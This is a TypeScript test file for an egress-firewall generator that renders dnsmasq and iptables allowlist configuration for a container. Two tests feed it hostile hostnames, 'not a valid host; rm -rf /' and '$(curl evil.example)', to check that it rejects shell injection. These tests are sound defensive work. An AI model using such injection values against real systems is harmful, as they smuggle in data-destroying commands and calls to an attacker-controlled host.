// Tests for #7857's dnsmasq/iptables text generation (egress-firewall-config.ts). Pure text rendering, no IO
// -- packages/loopover-miner/scripts/verify-egress-firewall.sh is the real, empirically-run proof that this
// generated text actually enforces anything against a live container.
import { describe, expect, it } from "vitest";
import { EGRESS_ALLOWED_TCP_PORTS, EGRESS_IPSET_NAME, InvalidEgressHostError, renderDisabledRuleset, renderDnsmasqConfig, renderIptablesRuleset } from "../../packages/loopover-miner/lib/egress-firewall-config";
import type { EgressAllowlistEntry } from "../../packages/loopover-miner/lib/egress-allowlist";

const ENTRIES: EgressAllowlistEntry[] = [
  { host: "github.com", reason: "target-repo-git-remote" },
  { host: "registry.npmjs.org", reason: "ecosystem:npm" },
];

describe("renderDnsmasqConfig (#7857)", () => {
  it("emits one ipset directive per allowed host, plus the fixed listener/upstream config", () => {
    const config = renderDnsmasqConfig(ENTRIES);
    expect(config).toContain("port=53");
    expect(config).toContain("bind-interfaces");
    expect(config).toContain("listen-address=127.0.0.1");
    expect(config).toContain("no-resolv");
    expect(config).toContain(`ipset=/github.com/${EGRESS_IPSET_NAME}`);
    expect(config).toContain(`ipset=/registry.npmjs.org/${EGRESS_IPSET_NAME}`);
  });

  it("uses the given upstream resolvers, not the default, when overridden", () => {
    const config = renderDnsmasqConfig(ENTRIES, ["9.9.9.9"]);
    expect(config).toContain("server=9.9.9.9");
    expect(config).not.toContain("server=1.1.1.1");
  });

  it("defaults to the documented public upstream resolvers when none are given", () => {
    const config = renderDnsmasqConfig(ENTRIES);
    expect(config).toContain("server=1.1.1.1");
    expect(config).toContain("server=8.8.8.8");
  });

  it("handles an empty entry list without error (still emits the fixed listener config)", () => {
    const config = renderDnsmasqConfig([]);
    expect(config).toContain("listen-address=127.0.0.1");
    expect(config).not.toContain("ipset=/");
  });

  it("throws InvalidEgressHostError rather than emitting shell-adjacent text for an invalid hostname", () => {
    expect(() => renderDnsmasqConfig([{ host: "not a valid host; rm -rf /", reason: "operator-declared" }])).toThrow(InvalidEgressHostError);
  });
});

describe("renderIptablesRuleset (#7857)", () => {
  it("defaults OUTPUT to DROP and allows loopback", () => {
    const ruleset = renderIptablesRuleset(ENTRIES);
    expect(ruleset).toContain("iptables -P OUTPUT DROP");
    expect(ruleset).toContain("iptables -A OUTPUT -o lo -j ACCEPT");
  });

  it("creates the ipset and allows egress matching it on every documented port", () => {
    const ruleset = renderIptablesRuleset(ENTRIES);
    expect(ruleset).toContain(`ipset create ${EGRESS_IPSET_NAME} hash:ip -exist`);
    for (const port of EGRESS_ALLOWED_TCP_PORTS) {
      expect(ruleset).toContain(`iptables -A OUTPUT -m set --match-set ${EGRESS_IPSET_NAME} dst -p tcp --dport ${port} -j ACCEPT`);
    }
  });

  it("allows outbound DNS only to the given upstream resolvers, both udp and tcp", () => {
    const ruleset = renderIptablesRuleset(ENTRIES, ["9.9.9.9"]);
    expect(ruleset).toContain("iptables -A OUTPUT -p udp -d 9.9.9.9 --dport 53 -j ACCEPT");
    expect(ruleset).toContain("iptables -A OUTPUT -p tcp -d 9.9.9.9 --dport 53 -j ACCEPT");
  });

  it("records every allowed host and its reason in a comment, for a human debugging a live container", () => {
    const ruleset = renderIptablesRuleset(ENTRIES);
    expect(ruleset).toContain("github.com [target-repo-git-remote]");
    expect(ruleset).toContain("registry.npmjs.org [ecosystem:npm]");
  });

  it("notes explicitly when the entry list is empty, rather than a silently blank comment", () => {
    const ruleset = renderIptablesRuleset([]);
    expect(ruleset).toMatch(/Allowed hosts \(0\): \(none/);
  });

  it("begins with #!/bin/sh and set -eu, since the entrypoint runs this as a real script", () => {
    const ruleset = renderIptablesRuleset(ENTRIES);
    expect(ruleset.split("\n")[0]).toBe("#!/bin/sh");
    expect(ruleset).toContain("set -eu");
  });

  it("throws InvalidEgressHostError rather than emitting shell-adjacent text for an invalid hostname", () => {
    expect(() => renderIptablesRuleset([{ host: "$(curl evil.example)", reason: "operator-declared" }])).toThrow(InvalidEgressHostError);
  });
});

describe("renderDisabledRuleset (#7857)", () => {
  it("is a valid, no-op shell script that exits 0 without touching iptables", () => {
    const ruleset = renderDisabledRuleset();
    expect(ruleset.split("\n")[0]).toBe("#!/bin/sh");
    expect(ruleset).toContain("exit 0");
    expect(ruleset).not.toContain("iptables");
  });

  it("mentions the env var responsible, so a human reading a live container's ruleset knows why", () => {
    expect(renderDisabledRuleset()).toContain("LOOPOVER_MINER_DISABLE_EGRESS_FIREWALL");
  });
});
